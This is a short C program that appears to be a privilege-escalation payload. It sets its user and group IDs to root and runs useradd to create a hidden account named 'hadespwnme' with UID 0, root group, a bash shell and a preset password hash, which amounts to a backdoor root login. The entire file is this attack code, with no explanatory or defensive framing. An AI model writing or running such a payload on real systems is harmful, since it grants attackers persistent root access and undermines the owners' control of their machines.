#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(void) {
    if (setgid(0) != 0 || setuid(0) != 0) {
        perror("setuid / setgid");
        exit(EXIT_FAILURE);
    }

    execl("/usr/sbin/useradd",
          "useradd",
          "-u", "0", "-o",
          "-g", "0",
          "-M",
          "-s", "/bin/bash",
          "-p","$6$usuJW/n3uL.209ou$2BS1XMuV0R4BrsLHHGFDHcPEVc85sk/s6YDUtiSydert89xF6j9BT079vNKxvY/b.qDKTtiWNsYBfG5l4VP4V/",
          "hadespwnme",
          (char *)NULL);

    perror("execl");
    return EXIT_FAILURE;
}
